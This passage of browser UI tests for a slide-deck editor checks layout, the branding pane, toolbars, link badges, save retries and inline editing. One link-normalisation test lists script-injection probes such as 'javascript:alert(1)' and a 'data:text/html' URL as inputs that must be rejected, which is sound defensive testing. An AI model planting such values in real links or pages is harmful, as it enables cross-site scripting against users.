const _mrdSetRange = (el, value) => {
  Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, "value").set.call(el, String(value));
  el.dispatchEvent(new Event("input", { bubbles: true }));
};
const _mrdOpenBranding = async () => {
  if (!_$("[data-testid='branding-panel']")) _click("[data-testid='brand-toggle']");
  return _waitFor(() => _$("[data-testid='branding-panel']"), 2000);
};
const _mrdCloseBranding = async () => {
  const close = _$("[data-testid='branding-panel-close']");
  if (close) _click(close);
  await _waitFor(() => !_$("[data-testid='branding-panel']"), 2000).catch(() => {});
};
// Undo every history step a test added, so branding edits do not leak.
const _mrdUndoTo = async (past) => {
  const hooks = _hooks();
  document.activeElement?.blur?.();
  for (let i = 0; i < 20 && hooks.getHistoryCounts && hooks.getHistoryCounts().past > past; i++) {
    _key("z", { ctrlKey: true });
    await _wait(60);
  }
};
const _mrdHover = async (el) => {
  el.dispatchEvent(new MouseEvent("mouseover", { bubbles: true }));
  await _mrdFrame();
};
const _mrdUnhover = async (el) => {
  el.dispatchEvent(new MouseEvent("mouseout", { bubbles: true, relatedTarget: document.body }));
  await _mrdFrame();
};

uiSuite("meridian-CR03 split image alignment", [
  { name: "CR03: image-left/right keep the image centred with the content column", fn: async () => {
    for (const layout of ["image-left", "image-right"]) {
      const marker = `CR03 ${layout}`;
      const img = await _mrdInject([
        { type: "heading", text: marker },
        { type: "bullets", items: ["One point", "Two point", "Three point"] },
        { type: "image", src: _mrdSvg(400, 300, "3b82f6") },
      ], { layout }, (vp) => vp?.textContent.includes(marker) && vp.querySelector("[data-split-image] img")?.naturalWidth > 0 ? vp.querySelector("[data-split-image]") : null);
      const con = _mrdViewport().querySelector("[data-split-content]");
      if (getComputedStyle(img).justifyContent !== "center") throw new Error(`${layout}: image column justify is ${getComputedStyle(img).justifyContent}`);
      if (!/center/.test(getComputedStyle(con).justifyContent)) throw new Error(`${layout}: content column justify is ${getComputedStyle(con).justifyContent}`);
      // The side image gets a measured height cap after first paint; poll until
      // the layout settles, then compare the two column centres.
      let m = null;
      const measure = () => {
        const ir = img.querySelector("img").getBoundingClientRect();
        const kids = Array.from(con.children).map((c) => c.getBoundingClientRect()).filter((r) => r.height > 0);
        m = { imageMid: (ir.top + ir.bottom) / 2, contentMid: (Math.min(...kids.map((r) => r.top)) + Math.max(...kids.map((r) => r.bottom))) / 2, gapTop: ir.top - img.getBoundingClientRect().top };
        return Math.abs(m.imageMid - m.contentMid) <= 3 && m.gapTop >= 4;
      };
      await _waitFor(measure, 2500).catch(() => {
        throw new Error(`${layout}: image centre ${m.imageMid.toFixed(1)} vs content centre ${m.contentMid.toFixed(1)}, top gap ${m.gapTop.toFixed(1)}`);
      });
    }
  }},
], { setup: _selectFirstModule });

uiSuite("meridian-CR08 branding accent zero", [
  { name: "CR08: accent height 0 removes the top line; the slider keeps 0", fn: async () => {
    const hooks = _hooks();
    const past = hooks.getHistoryCounts?.().past ?? 0;
    await _mrdInject([{ type: "heading", text: "CR08 accent" }], null, (vp) => vp?.textContent.includes("CR08 accent") ? vp : null);
    try {
      const panel = await _mrdOpenBranding();
      const range = panel.querySelector("[data-testid='branding-accent-height']");
      if (!range) throw new Error("accent height slider missing");
      _mrdSetRange(range, 6);
      const bar = await _waitFor(() => _mrdViewport().querySelector("[data-branding-accent]"), 2000).catch(() => null);
      if (!bar) throw new Error("accent bar not drawn at 6px");
      _mrdSetRange(range, 0);
      await _waitFor(() => !_mrdViewport().querySelector("[data-branding-accent]"), 2000)
        .catch(() => { throw new Error("accent bar still drawn at 0px"); });
      const live = _$("[data-testid='branding-accent-height']");
      if (live.value !== "0") throw new Error(`slider jumped to ${live.value} after 0`);
      if ((live.nextElementSibling?.textContent || "").trim() !== "0px") throw new Error(`label shows ${live.nextElementSibling?.textContent}`);
    } finally {
      await _mrdCloseBranding();
      await _mrdUndoTo(past);
    }
  }},
], { setup: _selectFirstModule });

uiSuite("meridian-CR09 branding side pane", [
  { name: "CR09: branding opens as a right pane beside the canvas and closes", fn: async () => {
    await _mrdCloseBranding();
    const before = _mrdViewport().getBoundingClientRect();
    const panel = await _mrdOpenBranding();
    await _mrdFrame();
    await _wait(150);
    try {
      if (window.innerWidth >= 768) {
        const p = panel.getBoundingClientRect();
        const c = _mrdViewport().getBoundingClientRect();
        if (panel.dataset.docked !== "right") throw new Error("panel is not docked right");
        if (p.left < c.right - 1) throw new Error(`pane left ${p.left.toFixed(0)} overlaps canvas right ${c.right.toFixed(0)}`);
        if (Math.abs(p.top - c.top) > 60 && p.top > c.top) throw new Error("pane is not beside the canvas");
        if (c.width >= before.width - 1) throw new Error("canvas did not resize for the pane");
        if (getComputedStyle(panel).overflowY !== "auto") throw new Error("pane does not scroll");
        if (document.documentElement.scrollWidth > window.innerWidth + 1) throw new Error("pane caused horizontal page scroll");
      }
      for (const sel of ["[data-testid='branding-accent-height']", "input[placeholder='Name / Company']", "input[placeholder='Tagline']"]) {
        if (!panel.querySelector(sel)) throw new Error(`control missing in pane: ${sel}`);
      }
    } finally {
      await _mrdCloseBranding();
    }
    if (_$("[data-testid='branding-panel']")) throw new Error("close control did not close the pane");
    await _waitFor(() => Math.abs(_mrdViewport().getBoundingClientRect().width - before.width) < 1.5, 2000)
      .catch(() => { throw new Error("canvas did not return to full width"); });
  }},
], { setup: _selectFirstModule });

// F3: every toolbar button and every editor overlay (✓ reviewed toggle,
// comment count) must be the top element at its own centre.
const _mrdCr15Clear = (bar, kind) => {
  const top = (el) => { const r = el.getBoundingClientRect(); const h = document.elementFromPoint((r.left + r.right) / 2, (r.top + r.bottom) / 2); return !!h && el.contains(h); };
  const where = kind ? kind + ": " : "";
  for (const b of bar.querySelectorAll("button")) if (!top(b)) throw new Error(`${where}toolbar button "${b.title || b.textContent}" is covered`);
  for (const o of document.querySelectorAll("[data-editor-overlay]")) if (!top(o)) throw new Error(`${where}editor overlay "${o.dataset.editorOverlay}" is covered`);
};
uiSuite("meridian-CR15 toolbar room above", [
  { name: "CR15: full-bleed image keeps its toolbar and popups inside the slide", fn: async () => {
    const block = await _mrdInject([{ type: "image", src: _mrdSvg(960, 540, "f59e0b") }], null,
      (vp) => { const b = vp?.querySelector("[data-block-type='image'] img"); return b?.naturalWidth > 0 ? vp.querySelector("[data-block-type='image']") : null; });
    await _mrdHover(block);
    try {
      const bar = await _waitFor(() => _mrdViewport().querySelector("[data-testid='block-hover-toolbar']"), 1500);
      const vp = _mrdViewport().getBoundingClientRect();
      const inView = (el) => { const r = el.getBoundingClientRect(); return r.top >= vp.top - 0.5 && r.bottom <= vp.bottom + 0.5 && r.left >= vp.left - 0.5 && r.right <= vp.right + 0.5; };
      if (bar.dataset.chromeInside !== "true" || !inView(bar)) throw new Error("toolbar is drawn above the slide edge");
      const hit = (el) => { const r = el.getBoundingClientRect(); const h = document.elementFromPoint((r.left + r.right) / 2, (r.top + r.bottom) / 2); return !!h && el.contains(h); };
      if (!hit(bar)) throw new Error("toolbar is not clickable");
      _mrdCr15Clear(bar);
      _click(bar.querySelector("button[title='Add link']"));
      const pop = await _waitFor(() => _$("[data-testid='block-link-popup']"), 1500);
      if (!inView(pop) || !hit(pop)) throw new Error("link popup is cut off or covered");
      _key("Escape");
      pop.querySelector("input")?.blur();
    } finally {
      await _mrdUnhover(block);
    }
  }},
  { name: "CR15: a normal slide keeps the toolbar outside the block top edge", fn: async () => {
    const block = await _mrdInject([{ type: "heading", text: "CR15 normal" }, { type: "text", text: "Body" }], null,
      (vp) => vp?.textContent.includes("CR15 normal") ? vp.querySelector("[data-block-type='heading']") : null);
    await _mrdHover(block);
    try {
      const bar = await _waitFor(() => _mrdViewport().querySelector("[data-testid='block-hover-toolbar']"), 1500);
      if (bar.dataset.chromeInside) throw new Error("toolbar moved inside on a block with room above");
      if (bar.getBoundingClientRect().top >= block.getBoundingClientRect().top) throw new Error("toolbar is not above the block");
      _mrdCr15Clear(bar);
    } finally {
      await _mrdUnhover(block);
    }
  }},
  { name: "F3: toolbar stays clear of the comment badge and reviewed toggle", fn: async () => {
    const extra = { comments: [{ id: "cr15-f3", text: "F3 badge", status: "open", createdAt: Date.now() }] };
    for (const [kind, blocks, sel] of [
      ["full-bleed", [{ type: "image", src: _mrdSvg(960, 540, "10b981") }], "[data-block-type='image']"],
      ["normal", [{ type: "heading", text: "CR15 F3 normal" }, { type: "text", text: "Body" }], "[data-block-type='heading']"],
    ]) {
      const block = await _mrdInject(blocks, extra, (vp) => (vp && _$("[data-editor-overlay='comments']") && vp.querySelector(sel)) || null);
      await _mrdHover(block);
      try {
        const bar = await _waitFor(() => _mrdViewport().querySelector("[data-testid='block-hover-toolbar']"), 1500);
        await _mrdFrame();
        _mrdCr15Clear(bar, kind);
      } finally {
        await _mrdUnhover(block);
      }
    }
    _hooks().injectBlocks([{ type: "text", text: "F3 done" }], { comments: [] });
  }},
], { setup: _selectFirstModule });

uiSuite("Link box input normalization", [
  { name: "bare domain, email and host:port get a scheme; unsafe schemes stay rejected", fn: async () => {
    const cases = [
      ["example.com", "https://example.com/"], ["  www.example.com/a ", "https://www.example.com/a"],
      ["me@example.com", "mailto:me@example.com"], ["example.com:8080/x", "https://example.com:8080/x"],
      ["https://example.org/p", "https://example.org/p"], ["", undefined], ["   ", undefined],
      ["javascript:alert(1)", undefined], ["data:text/html,x", undefined], ["\\\\host\\share", undefined],
    ];
    for (const [input, want] of cases) {
      const got = linkFromInput(input);
      if (got !== want) throw new Error(`linkFromInput(${JSON.stringify(input)}) = ${JSON.stringify(got)}, want ${JSON.stringify(want)}`);
    }
  }},
]);

uiSuite("Editor TOC toggle keys", [
  { name: "Ctrl+E and AltGr+[ toggle the TOC in the editor", fn: async () => {
    try { document.activeElement?.blur?.(); } catch {}
    const tocShown = () => _$$(".concept-row").length > 0;
    if (!tocShown()) throw new Error("TOC not shown at start");
    for (const [key, opts, label] of [["e", { ctrlKey: true }, "Ctrl+E"], ["[", { ctrlKey: true, altKey: true }, "AltGr+["]]) {
      _key(key, opts);
      await _waitFor(() => !tocShown(), 2000).catch(() => { throw new Error(label + " did not hide the TOC"); });
      _key(key, opts);
      await _waitFor(tocShown, 2000).catch(() => { throw new Error(label + " did not show the TOC again"); });
    }
  }},
], { setup: _selectFirstModule });

uiSuite("Cols layout block edits", [
  { name: "a link added to a right-column block is saved on that block", fn: async () => {
    const sel = "[data-cols-side='right'] [data-block-type='text']";
    const el = await _mrdInject([], { layout: "cols", L: [{ type: "heading", text: "Left col" }], R: [{ type: "text", text: "Right col text" }] }, (vp) => vp && vp.querySelector(sel));
    el.dispatchEvent(new MouseEvent("mouseover", { bubbles: true, relatedTarget: document.body }));
    const btn = await _waitFor(() => el.querySelector("[data-testid='block-hover-toolbar'] button[title='Add link']"), 2000);
    btn.click();
    const inp = await _waitFor(() => el.querySelector("[data-testid='block-link-popup'] input"), 2000);
    inp.value = "example.com/col";
    inp.dispatchEvent(new KeyboardEvent("keydown", { key: "Enter", bubbles: true }));
    await _waitFor(() => { const n = _mrdViewport()?.querySelector(sel); return n && n.getAttribute("data-pdf-link") === "https://example.com/col"; }, 2000)
      .catch(() => { throw new Error("right-column block did not keep its link"); });
  }},
], { setup: _selectFirstModule });

uiSuite("meridian-CR17 link badge placement", [
  { name: "CR17: link badges sit just after the label text on every item kind", fn: async () => {
    const L = "https://example.com/x";
    const cases = {
      "icon-row": [{ type: "icon-row", cols: 2, items: [
        { icon: "MessageSquare", title: "ChatGPT", text: "chatgpt.com", link: L },
        { icon: "Box", title: "Docker Sandboxes", text: "docker.com/products/docker-sandboxes", link: L },
        { icon: "Cpu", title: "A long wrapped title that keeps going across the column width for sure", text: "sub", link: L },
      ] }],
      bullets: [{ type: "bullets", items: [{ text: "Short", link: L }, { text: "A much longer bullet line that wraps onto a second visual line so the badge must follow the last word of the text", link: L }, { text: "Iconed", icon: "Star", link: L }] }],
      grid: [{ type: "grid", cols: 2, items: [{ blocks: [{ type: "text", text: "Wide cell word", link: L }] }, { blocks: [{ type: "heading", text: "Heading in a wide cell", link: L }] }] }],
      text: [{ type: "text", text: "Block-level link on a plain text block", link: L }],
    };
    for (const [name, blocks] of Object.entries(cases)) {
      const want = blocks[0].items ? blocks[0].items.length : blocks.length;
      const placed = (vp) => {
        const all = vp ? Array.from(vp.querySelectorAll("[data-link-badge]")) : [];
        return all.length === want && all.every((b) => b.dataset.linkBadgePlaced === "text-end") ? all : null;
      };
      await _mrdInject(blocks, null, placed).catch(() => { throw new Error(`${name}: badges not placed at the text end`); });
      await _wait(150);
      // Re-query: a late re-render can replace the nodes found first.
      const badges = placed(_mrdViewport());
      if (!badges) throw new Error(`${name}: badges lost their text-end placement`);
      for (const b of badges) {
        const br = b.getBoundingClientRect();
        const rects = [];
        const walker = document.createTreeWalker(b.parentElement, NodeFilter.SHOW_TEXT);
        const range = document.createRange();
        for (let n = walker.nextNode(); n; n = walker.nextNode()) {
          if (b.contains(n) || !n.nodeValue.trim()) continue;
          range.selectNodeContents(n);
          rects.push(...Array.from(range.getClientRects()));
        }
        if (rects.some((r) => r.left < br.right - 0.5 && r.right > br.left + 0.5 && r.top < br.bottom - 0.5 && r.bottom > br.top + 0.5)) throw new Error(`${name}: badge overlaps text`);
        const sameLine = rects.filter((r) => r.top < br.bottom && r.bottom > br.top && r.right <= br.left + 1);
        const gap = sameLine.length ? Math.min(...sameLine.map((r) => br.left - r.right)) : Infinity;
        if (!(gap >= 0 && gap <= 12)) {
          const fmt = (r) => [r.left, r.top, r.right, r.bottom].map((v) => Math.round(v)).join(",");
          throw new Error(`${name}: badge ${fmt(br)} is ${gap}px from the text end; text ${rects.map(fmt).join(" | ")}`);
        }
      }
    }
  }},
], { setup: _selectFirstModule });

// meridian-F7 (CR13): the top-bar density level is a function of the current
// width only. The level at a width must not depend on the widths before it.
uiSuite("meridian-CR13 top bar level has no history", [
  { name: "Level at each width equals the level after a fresh jump (sweep down, then up)", fn: async () => {
    const h = await _waitFor(() => _$("header[data-hdr-level]"), 2000);
    const frames = () => new Promise((r) => requestAnimationFrame(() => requestAnimationFrame(r)));
    // Read the level from what is drawn (hidden labels sit at zero width), and
    // check that it agrees with the header's own data-hdr-level.
    const hiddenLabel = (sel) => _$$(sel, h).some((e) => e.style.width === "0px");
    const drawnLevel = () => {
      if (!hiddenLabel("[data-testid='view-switch'] [data-vs-label]")) return "4";
      if (!hiddenLabel("[data-hdr-label='3']")) return "3";
      if (!hiddenLabel("[data-hdr-label='2']")) return "2";
      return _$("[data-testid='present-btn']", h)?.parentElement?.style.flexShrink === "1" ? "0" : "1";
    };
    const settle = async (w) => {
      h.style.width = `${w}px`;
      for (let f = 0; f < 3; f++) await frames();
      const lvl = drawnLevel();
      if (h.dataset.hdrLevel !== lvl) throw new Error(`${w}px: data-hdr-level ${h.dataset.hdrLevel} but drawn level ${lvl}`);
      return lvl;
    };
    const widths = [1000];
    for (let w = 1024; w <= 1920; w += 32) widths.push(w);
    widths.push(1440);
    const prev = h.style.width;
    const bad = [];
    try {
      // "Fresh" reference: jump to the width from a narrow bar (the boot level is low).
      const fresh = {};
      for (const w of widths) { await settle(700); fresh[w] = await settle(w); }
      for (const w of widths) { await settle(2400); const got = await settle(w); if (got !== fresh[w]) bad.push(`${w}px from wide: ${got} vs fresh ${fresh[w]}`); }
      const down = [...widths].sort((a, b) => b - a);
      for (const w of down) { const got = await settle(w); if (got !== fresh[w]) bad.push(`${w}px sweep down: ${got} vs fresh ${fresh[w]}`); }
      for (const w of [...down].reverse()) { const got = await settle(w); if (got !== fresh[w]) bad.push(`${w}px sweep up: ${got} vs fresh ${fresh[w]}`); }
      // The reported case: a narrow bar that grows must get its labels back.
      await settle(1000);
      const grown = await settle(1440);
      if (grown !== fresh[1440]) bad.push(`1000->1440: ${grown} vs fresh ${fresh[1440]}`);
      // No flapping: the level stays put over many frames at a fixed width.
      for (const w of [1024, 1440, 1920]) {
        const first = await settle(w);
        for (let f = 0; f < 6; f++) { await frames(); if (h.dataset.hdrLevel !== first) { bad.push(`${w}px flaps ${first}->${h.dataset.hdrLevel}`); break; } }
      }
      if (fresh[1920] !== "4") bad.push(`1920px level ${fresh[1920]}, want 4`);
    } finally {
      h.style.width = prev;
      await frames();
    }
    if (bad.length) throw new Error(`${bad.length} mismatches — ${bad.slice(0, 4).join(" | ")}`);
  }},
], { setup: _selectFirstModule });

// meridian-F7 (CR01): the "file already holds this" signature moves only after
// a confirmed write. A failed or rejected save must be retried by the next
// identical flush, or the edit is lost.
uiSuite("meridian-CR01 local save retries after a failed write", [
  { name: "Failed save is retried; a confirmed save is not repeated", fn: async () => {
    const hooks = _hooks();
    if (!hooks.capturePostDemoFlushForTest || !hooks.flushDemoSaveForTest || !hooks.setGuidelinesForTest) throw new Error("save test hooks missing");
    const originalStorage = window.storage;
    const originalLocalSend = window.__velaSendDeckUpdate;
    const writes = [];
    let outcome = "fail";
    window.storage = { ...(originalStorage || {}), set: async () => {}, delete: async () => {} };
    window.__velaSendDeckUpdate = (payload) => {
      writes.push(payload);
      if (outcome === "reject") return Promise.reject(new Error("save failed (test)"));
      return Promise.resolve(outcome === "ok");
    };
    const flush = () => hooks.flushDemoSaveForTest(hooks.capturePostDemoFlushForTest(), { local: true, storage: false });
    try {
      hooks.setGuidelinesForTest("meridian-F7 unsaved edit");
      await _wait(50);
      flush();
      await _waitFor(() => writes.length === 1, 2000);
      await _wait(30);
      flush(); // same payload, previous write failed: must write again
      await _waitFor(() => writes.length === 2, 2000).catch(() => { throw new Error("identical flush after a failed save was skipped"); });
      outcome = "reject";
      await _wait(30);
      flush();
      await _waitFor(() => writes.length === 3, 2000).catch(() => { throw new Error("identical flush after a failed save was skipped (2)"); });
      await _wait(30);
      flush(); // previous write rejected: must write again
      await _waitFor(() => writes.length === 4, 2000).catch(() => { throw new Error("identical flush after a rejected save was skipped"); });
      outcome = "ok";
      await _wait(30);
      flush();
      await _waitFor(() => writes.length === 5, 2000).catch(() => { throw new Error("retry after failures was skipped"); });
      await _wait(30);
      flush(); // confirmed on disk now: nothing to write
      await _wait(200);
      if (writes.length !== 5) throw new Error(`confirmed payload written again (${writes.length} writes)`);
      if (writes.some((p) => p.guidelines !== "meridian-F7 unsaved edit")) throw new Error("wrong payload sent");
    } finally {
      window.storage = originalStorage;
      window.__velaSendDeckUpdate = originalLocalSend;
      hooks.restoreStartupDeck?.();
      await _wait(100);
    }
  }},
]);

// meridian-F8 (CR01): with a slow backend, the file must end equal to the
// latest deck state after all writes settle — also when the latest state is
// the one the file held before the in-flight write (edit, then undo).
const _meridianF8SlowSave = async (steps, want) => {
  const hooks = _hooks();
  if (!hooks.capturePostDemoFlushForTest || !hooks.flushDemoSaveForTest || !hooks.setGuidelinesForTest) throw new Error("save test hooks missing");
  const originalStorage = window.storage;
  const originalLocalSend = window.__velaSendDeckUpdate;
  const calls = [];
  let pending = 0;
  let disk = null;
  let latency = 0;
  window.storage = { ...(originalStorage || {}), set: async () => {}, delete: async () => {} };
  // Stub backend: each write lands on "disk" in call order after `latency` ms.
  window.__velaSendDeckUpdate = (payload) => {
    calls.push(payload.guidelines);
    pending++;
    return new Promise((r) => setTimeout(() => { disk = payload.guidelines; pending--; r(true); }, latency));
  };
  const flush = () => hooks.flushDemoSaveForTest(hooks.capturePostDemoFlushForTest(), { local: true, storage: false });
  const edit = async (g) => {
    hooks.setGuidelinesForTest(g);
    await _wait(50);
    flush();
    await _wait(30);
  };
  try {
    // Baseline: a confirmed write puts "base" on disk.
    await edit("meridian-F8 base");
    await _waitFor(() => pending === 0 && disk === "meridian-F8 base", 2000);
    latency = 400;
    for (const g of steps) await edit(g); // later steps run while the first write is in flight
    await _waitFor(() => pending === 0, 3000);
    await _wait(100);
    if (disk !== want) throw new Error(`disk "${disk}", want "${want}"; calls ${JSON.stringify(calls)}`);
    // Settled and equal: one more flush of the same state writes nothing.
    const n = calls.length;
    flush();
    await _wait(200);
    if (calls.length !== n) throw new Error(`settled state written again; calls ${JSON.stringify(calls)}`);
  } finally {
    window.storage = originalStorage;
    window.__velaSendDeckUpdate = originalLocalSend;
    hooks.restoreStartupDeck?.();
    await _wait(100);
  }
};
uiSuite("meridian-CR01 local save ends at the latest state with a slow backend", [
  { name: "Edit, then undo during the in-flight write: file ends at the original", fn: () => _meridianF8SlowSave(["meridian-F8 edit", "meridian-F8 base"], "meridian-F8 base") },
  { name: "Edit, then edit again during the in-flight write: file ends at the last edit", fn: () => _meridianF8SlowSave(["meridian-F8 edit", "meridian-F8 edit 2"], "meridian-F8 edit 2") },
]);

// tideline-CR26: every rendered block text is inline-editable in the editor.
// Find the click-to-edit display node for an exact text inside the slide.
const _tlEditNode = (text) => _$$("div", _mrdViewport() || document).find((el) =>
  el.style.cursor === "pointer" && el.textContent.trim() === text && !_$$("div", el).some((c) => c.style.cursor === "pointer"));
// Click the text, type the new value, commit with Enter, wait for the new text.
const _tlEdit = async (from, to, shown = to) => {
  const node = await _waitFor(() => _tlEditNode(from), 2000).catch(() => { throw new Error(`"${from}" is not inline-editable`); });
  _click(node);
  const ed = await _waitFor(() => _$("[contenteditable='true']", _mrdViewport()), 1500);
  ed.textContent = to;
  ed.dispatchEvent(new KeyboardEvent("keydown", { key: "Enter", bubbles: true, cancelable: true }));
  await _waitFor(() => !_$("[contenteditable='true']") && _tlEditNode(shown), 2000).catch(() => { throw new Error(`"${from}" -> "${to}" did not commit`); });
};
uiSuite("tideline-CR26 edit every block text", [
  { name: "CR26: checklist item text and status label edit inline, with undo and redo", fn: async () => {
    const hooks = _hooks();
    await _mrdInject([{ type: "checklist", items: [{ text: "Task one", status: "pending" }, { text: "Task two", status: "done" }] }], null,
      (vp) => vp?.textContent.includes("Task one") ? vp : null);
    const past0 = hooks.getHistoryCounts ? hooks.getHistoryCounts().past : 0;
    try {
      await _tlEdit("Task one", "Task edited");
      await _tlEdit("PENDING", "blocked", "BLOCKED");
      const blockedCol = _tlEditNode("BLOCKED")?.style.color;
      if (!/239, 68, 68|#ef4444/i.test(blockedCol || "")) throw new Error(`typed status did not switch the status (color ${blockedCol})`);
      await _tlEdit("DONE", "Shipped");
      _key("z", { ctrlKey: true });
      await _waitFor(() => _tlEditNode("DONE"), 2000).catch(() => { throw new Error("undo did not restore the label"); });
      _key("y", { ctrlKey: true });
      await _waitFor(() => _tlEditNode("Shipped"), 2000).catch(() => { throw new Error("redo did not restore the custom label"); });
      await _tlEdit("Shipped", "", "DONE");
    } finally {
      await _mrdUndoTo(past0);
    }
  }},
  { name: "CR26: comparison, matrix, number-row, progress and flow texts edit inline", fn: async () => {
    const cases = [
      [[{ type: "comparison", dividerLabel: "OR", items: [{ title: "Left col", items: ["Left point"] }, { title: "Right col", items: [{ text: "Right point" }] }] }],
        [["Left col", "Left new"], ["Right col", "Right new"], ["Left point", "LP new"], ["Right point", "RP new"], ["OR", "VERSUS"]]],
      [[{ type: "matrix", xLeft: "Low X", xRight: "High X", yTop: "High Y", yBottom: "Low Y", quadrants: [{ title: "Q one", items: ["Q point"] }, { title: "Q two" }, { title: "Q three" }, { title: "Q four" }] }],
        [["Q one", "Q1 new"], ["Q point", "QP new"], ["Low X", "LX new"], ["High Y", "HY new"]]],
      [[{ type: "number-row", items: [{ value: "42", label: "Answers" }, { value: "7", label: "Days" }] }],
        [["42", "43"], ["Answers", "Replies"]]],
      [[{ type: "progress", leftLabel: "Start", rightLabel: "End", annotation: "Note here", items: [{ label: "Bar", value: 40 }] }],
        [["Start", "Begin"], ["End", "Finish"], ["Note here", "Note new"]]],
      [[{ type: "flow", gateLabel: "Gate", items: [{ label: "A", gate: true }, { label: "B" }] }],
        [["Gate", "Check"]]],
    ];
    for (const [blocks, edits] of cases) {
      await _mrdInject(blocks, null, (vp) => vp?.textContent.includes(edits[0][0]) ? vp : null);
      // Undo one step per edit (history counts stop growing at MAX_HISTORY).
      let done = 0;
      try {
        for (const [from, to] of edits) { await _tlEdit(from, to); done++; }
      } catch (e) { throw new Error(`${blocks[0].type}: ${e.message}`); }
      finally { document.activeElement?.blur?.(); for (let k = 0; k < done; k++) { _key("z", { ctrlKey: true }); await _wait(60); } }
      await _waitFor(() => _tlEditNode(edits[0][0]), 2000).catch(() => { throw new Error(`${blocks[0].type}: undo did not restore the text`); });
    }
  }},
  { name: "CR26: a cleared text keeps a clickable target and can be typed again", fn: async () => {
    const cases = [
      [{ type: "checklist", items: [{ text: "Task one", status: "pending" }] }, "Task one"],
      [{ type: "comparison", items: [{ title: "L", items: ["Left point"] }, { title: "R", items: ["Right point"] }] }, "Left point"],
      [{ type: "matrix", quadrants: [{ title: "Q1", items: ["Q point"] }, { title: "Q2" }, { title: "Q3" }, { title: "Q4" }] }, "Q point"],
      [{ type: "number-row", items: [{ value: "42", label: "Answers" }] }, "42"],
      [{ type: "bullets", items: ["Bullet one", "Bullet two"] }, "Bullet one"],
    ];
    for (const [block, from] of cases) {
      await _mrdInject([block], null, (vp) => vp?.textContent.includes(from) ? vp : null);
      let done = 0;
      try {
        await _tlEdit(from, "", EDIT_PLACEHOLDER); done++;
        const node = _tlEditNode(EDIT_PLACEHOLDER);
        const r = node.getBoundingClientRect();
        if (!(r.width > 4 && r.height > 4)) throw new Error(`empty target is ${r.width}x${r.height}`);
        // With the pointer on it, the item's hover toolbar must not cover the placeholder.
        const ph = _$("[data-vela-placeholder]", node);
        ph.dispatchEvent(new MouseEvent("mouseover", { bubbles: true }));
        await _wait(80);
        const pr = ph.getBoundingClientRect();
        const hit = document.elementFromPoint(pr.left + pr.width / 2, pr.top + pr.height / 2);
        if (!node.contains(hit)) throw new Error(`placeholder is covered by ${hit?.tagName} "${(hit?.textContent || "").slice(0, 20)}"`);
        await _tlEdit(EDIT_PLACEHOLDER, "Typed again"); done++;
      } catch (e) { throw new Error(`${block.type}: ${e.message}`); }
      finally { document.activeElement?.blur?.(); for (let k = 0; k < done; k++) { _key("z", { ctrlKey: true }); await _wait(60); } }
      await _waitFor(() => _tlEditNode(from), 2000).catch(() => { throw new Error(`${block.type}: undo did not restore the text`); });
    }
  }},
  { name: "CR26: SVG labels (cycle, funnel, flow loop) edit inline, with undo and redo, and do not zoom", fn: async () => {
    const svgText = (t) => _$$("text[data-svg-edit]", _mrdViewport() || document).find((el) => el.textContent.trim() === t);
    const zoomed = () => document.body.textContent.includes("ESC or click to close");
    const svgEdit = async (from, to, key = "Enter") => {
      const node = await _waitFor(() => svgText(from), 2000).catch(() => { throw new Error(`"${from}" is not an editable SVG label`); });
      _clickMod(node);
      const inp = await _waitFor(() => _$("[data-testid='svg-text-edit']", _mrdViewport()), 1500).catch(() => { throw new Error(`"${from}": no edit input`); });
      if (zoomed()) throw new Error(`"${from}": click opened the zoom overlay`);
      if (document.activeElement !== inp) throw new Error(`"${from}": input has no focus`);
      inp.value = to;
      inp.dispatchEvent(new KeyboardEvent("keydown", { key, bubbles: true, cancelable: true }));
      const shown = key === "Escape" ? from : to;
      await _waitFor(() => !_$("[data-testid='svg-text-edit']") && svgText(shown), 2000).catch(() => { throw new Error(`"${from}" -> "${to}" (${key}) did not show "${shown}"`); });
    };
    const cases = [
      [{ type: "cycle", centerLabel: "Center L", centerSub: "Center S", items: [{ label: "CyA" }, { label: "CyB" }, { label: "CyC" }] }, [["CyA", "CyA2"], ["Center L", "CL2"], ["Center S", "CS2"]]],
      [{ type: "funnel", items: [{ label: "FunA", value: "100", drop: "-40%" }, { label: "FunB", value: "60" }] }, [["FunA", "FunA2"], ["100", "101"], ["-40%", "-41%"]]],
      [{ type: "flow", loop: true, loopLabel: "LoopH", items: [{ label: "A" }, { label: "B" }] }, [["LoopH", "LoopH2"]]],
      [{ type: "flow", loop: true, direction: "vertical", loopLabel: "LoopV", items: [{ label: "A" }, { label: "B" }] }, [["LoopV", "LoopV2"]]],
    ];
    for (const [block, edits] of cases) {
      await _mrdInject([block], null, (vp) => vp && svgText(edits[0][0]) ? vp : null);
      let done = 0;
      try {
        await svgEdit(edits[0][0], "Cancelled", "Escape");
        for (const [from, to] of edits) {
          await svgEdit(from, to); done++;
          _key("z", { ctrlKey: true });
          await _waitFor(() => svgText(from), 2000).catch(() => { throw new Error(`undo did not restore "${from}"`); });
          _key("y", { ctrlKey: true });
          await _waitFor(() => svgText(to), 2000).catch(() => { throw new Error(`redo did not restore "${to}"`); });
        }
      } catch (e) { throw new Error(`${block.type}: ${e.message}`); }
      finally { document.activeElement?.blur?.(); for (let k = 0; k < done; k++) { _key("z", { ctrlKey: true }); await _wait(60); } }
      await _waitFor(() => svgText(edits[0][0]), 2000).catch(() => { throw new Error(`${block.type}: undo did not restore the text`); });
    }
  }},
  { name: "CR26: a cleared optional SVG label shows a placeholder and can be typed again", fn: async () => {
    const texts = () => _$$("text[data-svg-edit]", _mrdViewport() || document);
    const svgText = (t) => texts().find((el) => el.textContent.trim() === t);
    const open = async (node, what) => {
      _clickMod(node);
      return _waitFor(() => _$("[data-testid='svg-text-edit']", _mrdViewport()), 1500).catch(() => { throw new Error(`${what}: no edit input`); });
    };
    const commit = (inp, v) => { inp.value = v; inp.dispatchEvent(new KeyboardEvent("keydown", { key: "Enter", bubbles: true, cancelable: true })); };
    const cases = [
      [{ type: "cycle", centerLabel: "CtrL", centerSub: "CtrS", items: [{ label: "CyA" }, { label: "CyB" }] }, ["CtrL", "CtrS"]],
      [{ type: "funnel", items: [{ label: "FunA", value: "100", drop: "-40%" }] }, ["100", "-40%"]],
      [{ type: "flow", loop: true, loopLabel: "LoopH", items: [{ label: "A" }, { label: "B" }] }, ["LoopH"]],
      [{ type: "flow", loop: true, direction: "vertical", loopLabel: "LoopV", items: [{ label: "A" }, { label: "B" }] }, ["LoopV"]],
    ];
    for (const [block, labels] of cases) {
      await _mrdInject([block], null, (vp) => vp && svgText(labels[0]) ? vp : null);
